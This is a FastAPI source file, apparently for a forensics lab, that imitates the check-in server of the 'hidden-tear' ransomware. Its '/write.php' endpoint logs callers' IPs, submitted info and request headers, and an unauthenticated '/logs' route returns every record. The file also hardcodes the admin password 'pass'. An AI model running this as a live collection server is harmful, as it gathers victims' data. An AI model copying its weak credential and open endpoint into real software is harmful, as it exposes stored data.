"""
Main application entry point for the FastAPI backend.
"""
import asyncio
import atexit
import logging
import os
import secrets
import sqlite3
import json
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

# Create the main app instance
app = FastAPI(
    title="Digital Forensics Backend",
    root_path="/hidden-tear",
)


DB_FILE = "data/logs.db"
ADMIN_PASSWORD = "pass" # Change this as needed

# Ensure data directory exists
os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)

def init_db():
    """Initialize the database with the logs table."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ip TEXT,
                  info TEXT,
                  headers TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# Initialize DB on startup
init_db()

@app.get("/")
async def root():
    """Serve the dashboard."""
    return FileResponse('index.html')

@app.get("/write.php")
async def write_php(info: str, request: Request):
    """Save a simulated virus infection - save user details to a database."""
    ip = request.client.host if request.client else "Unknown"
    headers = str(request.headers)
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (ip, info, headers) VALUES (?, ?, ?)", (ip, info, headers))
    conn.commit()
    conn.close()

    return {"status": "Ok"}

@app.get("/logs")
async def get_logs():
    """Return all logs from the database."""
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()
    
    return [dict(row) for row in rows]

@app.post("/clear")
async def clear_logs(request: Request):
    """Clear all logs if the correct password is provided."""
    body = await request.json()
    password = body.get("password")
    
    if password != ADMIN_PASSWORD:
        return JSONResponse(status_code=403, content={"error": "Invalid password"})

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM logs")
    # Reset Auto Increment
    c.execute("DELETE FROM sqlite_sequence WHERE name='logs'")
    conn.commit()
    conn.close()
    
    return {"status": "cleared"}


